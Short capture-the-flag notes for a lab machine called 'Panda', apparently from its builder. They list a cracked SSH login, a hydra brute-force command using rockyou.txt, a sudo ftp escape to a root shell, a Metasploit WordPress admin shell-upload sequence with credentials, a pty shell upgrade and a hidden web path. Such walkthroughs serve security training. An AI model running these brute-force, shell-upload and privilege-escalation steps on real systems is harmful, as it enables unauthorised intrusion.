Panda

`shifu:batman` (`hydra -l shifu -P /usr/share/wordlists/rockyou.txt ssh://IP`)
SSH in + CHANGE PASSWORD

`sudo -l /usr/bin/ftp`
`!/bin/bash`

Alternate way:
on your machine edit /etc/hosts to add panda as panda.thm
```
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > set USERNAME po
msf exploit(wp_admin_shell_upload) > set PASSWORD password1
msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
msf exploit(wp_admin_shell_upload) > exploit
```

`cd /home` to stop the errors

`python -c 'import pty; pty.spawn("/bin/sh")'`

`sudo -l /usr/bin/ftp`
`!/bin/bash`

Alternate way:
`http://IP/06d63d6798d9b6c2f987f045b12031d6/index.php` (idk how you are supposed to find this; I only know this from looking around the box after exploiting using other methods)


SUID exploits to remove:
- find